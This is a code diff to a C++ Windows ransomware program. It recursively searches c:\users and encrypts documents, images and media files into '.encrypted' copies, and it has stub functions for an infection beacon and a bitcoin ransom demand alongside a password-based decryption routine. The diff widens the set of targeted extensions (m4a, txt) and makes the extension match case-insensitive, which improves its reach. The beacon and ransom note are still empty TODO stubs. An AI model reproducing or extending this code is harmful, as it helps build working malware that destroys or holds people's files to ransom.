@@ -15,8 +15,6 @@
 #include <filesystem>
 #include <windows.h>
 #include <wincrypt.h>
-//#include <boost/algorithm/string.hpp>
-
 
 namespace fs = std::experimental::filesystem;
 
@@ -34,8 +32,8 @@ bool DecryptThisFile(std::string path, std::string decryptionKey);
 bool ExcludePath(std::string checkString);
 bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string key);
 bool Decryptor(std::string fileToDecrypt, std::string fileRestored, std::string key);
-void SendInfectionBeacon();
-void RansomMessage();
+void SendInfectionBeacon(DWORD dwEncryptedFileCount);
+void RansomMessage(DWORD dwEncryptedFileCount);
 bool AnalysisCheck();
 void PrintProgress();
 
@@ -113,10 +111,10 @@ int main(int argc, char* argv[])
 		dwEncryptionResult = FindFiles();
 
 		// Send network beacon to report ransom/encryption completed
-		SendInfectionBeacon();
+		SendInfectionBeacon(dwEncryptionResult);
 
 		// Display message to user demanding bitcoin payment for decryption key
-		RansomMessage();
+		RansomMessage(dwEncryptionResult);
 	}
 	else
 	{
@@ -128,7 +126,8 @@ int main(int argc, char* argv[])
 		dwDecryptionResult = FindEncryptedFiles(keyDecrypt);
 		if (dwDecryptionResult > 0)
 		{
-			std::cout << "< " << std::dec << dwDecryptionResult <<" > files failed to recover.  Rerun the program with your password." << " [0x" << std::hex << dwDecryptionResult << "]" << std::endl;
+			std::cout << "0x" << std::hex << dwDecryptionResult << " [" << std::dec << dwDecryptionResult << "] files failed to recover.  Rerun the program with your password." << std::endl;
+			//std::cout << "< " << std::dec << dwDecryptionResult << " > files failed to recover.  Rerun the program with your password." << " [0x" << std::hex << dwDecryptionResult << "]" << std::endl;
 		}
 	}
 
@@ -165,7 +164,7 @@ bool AnalysisCheck()
 	return false; // stubbed for now allow execution
 }
 
-void SendInfectionBeacon()
+void SendInfectionBeacon(DWORD dwEncryptedFileCount)
 {
 	// TODO: Add code to send an infection beacon to a website, twitter, 
 	//       slack, email, or some other network destination to track infections
@@ -173,7 +172,7 @@ void SendInfectionBeacon()
 	// Beacon data could include machinename, username, # files encrypted, etc
 }
 
-void RansomMessage()
+void RansomMessage(DWORD dwEncryptedFileCount)
 {
 	// TODO: Add code to display a ransom message to the user, and to 
 	//       demand bitcoin payment to get the decryption key
@@ -190,7 +189,7 @@ void PrintProgress()
 	for (int i = 0; i < 6; i++)
 	{
 		std::cout << ".";
-		Sleep(200);
+		Sleep(150);
 	}
 	std::cout << "." << std::endl;
 }
@@ -630,7 +629,7 @@ DWORD FindFiles()
 	DWORD dwEncryptionCounter = 0;
 
 	// File extension filters to target important files
-	// Lowercase extenstions
+	// Using lowercase extenstions
 	const std::string bmp = ".bmp";
 	const std::string jpg = ".jpg";
 	const std::string jpeg = ".jpeg";
@@ -641,6 +640,7 @@ DWORD FindFiles()
 	const std::string mpeg = ".mpeg";
 	const std::string mov = ".mov";
 	const std::string mp3 = ".mp3";
+	const std::string m4a = ".m4a";
 	const std::string doc = ".doc";
 	const std::string docx = ".docx";
 	const std::string xls = ".xls";
@@ -648,75 +648,45 @@ DWORD FindFiles()
 	const std::string ppt = ".ppt";
 	const std::string pptx = ".pptx";
 	const std::string pdf = ".pdf";
+	const std::string txt = ".txt";
 
-	// Uppercase extenstions
-	const std::string BMP = ".BMP";
-	const std::string JPG = ".JPG";
-	const std::string JPEG = ".JPEG";
-	const std::string PNG = ".PNG";
-	const std::string GIF = ".GIF";
-	const std::string MP4 = ".MP4";
-	const std::string MPG = ".MPG";
-	const std::string MPEG = ".MPEG";
-	const std::string MOV = ".MOV";
-	const std::string MP3 = ".MP3";
-	const std::string DOC = ".DOC";
-	const std::string DOCX = ".DOCX";
-	const std::string XLS = ".XLS";
-	const std::string XLSX = ".XLSX";
-	const std::string PPT = ".PPT";
-	const std::string PPTX = ".PPTX";
-	const std::string PDF = ".PDF";
-
-
+	
+	// Restricting search path to the Users directory
 	std::string path = "c:\\users";
-	std::string temp;
+	std::string tempExt;
 
 	for (const auto& entry : fs::recursive_directory_iterator(path))
 	{
 		// Check for paths to exclude from processing
 		if (ExcludePath(entry.path().string()))
 		{
-			continue; // Excluding path 
+			continue; // Excluding path by terminating the current loop iteration
 		}
 
-		temp = entry.path().extension().string();
-		//std::cout << "Working: " << temp << std::endl;
+		// Convert extention to lowercase for later comparison
+		tempExt = entry.path().extension().string();
+		std::transform(tempExt.begin(), tempExt.end(), tempExt.begin(), ::tolower);
 
-		if (entry.path().extension() == jpg ||
-			entry.path().extension() == jpeg ||
-			entry.path().extension() == png ||
-			entry.path().extension() == gif ||
-			entry.path().extension() == mp4 ||
-			entry.path().extension() == mpg ||
-			entry.path().extension() == mpeg ||
-			entry.path().extension() == mov ||
-			entry.path().extension() == mp3 ||
-			entry.path().extension() == bmp ||
-			entry.path().extension() == doc ||
-			entry.path().extension() == docx ||
-			entry.path().extension() == xls ||
-			entry.path().extension() == xlsx ||
-			entry.path().extension() == ppt ||
-			entry.path().extension() == pptx ||
-			entry.path().extension() == pdf ||
-			entry.path().extension() == JPG ||
-			entry.path().extension() == JPEG ||
-			entry.path().extension() == PNG ||
-			entry.path().extension() == GIF ||
-			entry.path().extension() == MP4 ||
-			entry.path().extension() == MPG ||
-			entry.path().extension() == MPEG ||
-			entry.path().extension() == MOV ||
-			entry.path().extension() == MP3 ||
-			entry.path().extension() == BMP ||
-			entry.path().extension() == DOC ||
-			entry.path().extension() == DOCX ||
-			entry.path().extension() == XLS ||
-			entry.path().extension() == XLSX ||
-			entry.path().extension() == PPT ||
-			entry.path().extension() == PPTX ||
-			entry.path().extension() == PDF)
+		if (tempExt == jpg ||
+			tempExt == jpeg ||
+			tempExt == png ||
+			tempExt == gif ||
+			tempExt == mp4 ||
+			tempExt == mpg ||
+			tempExt == mpeg ||
+			tempExt == mov ||
+			tempExt == mp3 ||
+			tempExt == m4a ||
+			tempExt == bmp ||
+			tempExt == doc ||
+			tempExt == docx ||
+			tempExt == xls ||
+			tempExt == xlsx ||
+			tempExt == ppt ||
+			tempExt == pptx ||
+			tempExt == pdf ||
+			tempExt == txt
+			)
 		{
 			//std::cout << entry.path() << std::endl;
 			dwFileCounter++;
@@ -745,10 +715,11 @@ DWORD FindEncryptedFiles(std::string decryptionKey)
 	DWORD dwFileCounter = 0;
 	DWORD dwDecryptionCounter = 0;
 
-	// File extension filters to target encrypted files
-	// Lowercase extenstions
+	// File extension filter to target encrypted files
+	// Using lowercase extenstions
 	const std::string encrypted = ".encrypted";
 
+	// Restricting search path to the Users directory
 	std::string path = "c:\\users";
 
 	for (const auto& entry : fs::recursive_directory_iterator(path))
@@ -756,7 +727,7 @@ DWORD FindEncryptedFiles(std::string decryptionKey)
 		// Check for paths to exclude from processing
 		if (ExcludePath(entry.path().string()))
 		{
-			continue; // Excluding path 
+			continue; // Excluding path by terminating the current loop iteration 
 		}
 
 		if (entry.path().extension() == encrypted)
@@ -764,7 +735,7 @@ DWORD FindEncryptedFiles(std::string decryptionKey)
 			//std::cout << entry.path() << std::endl;
 			dwFileCounter++;
 
-			// Encrypt file
+			// Decrypt file
 			if (DecryptThisFile(entry.path().string(), decryptionKey))
 			{
 				dwDecryptionCounter++;
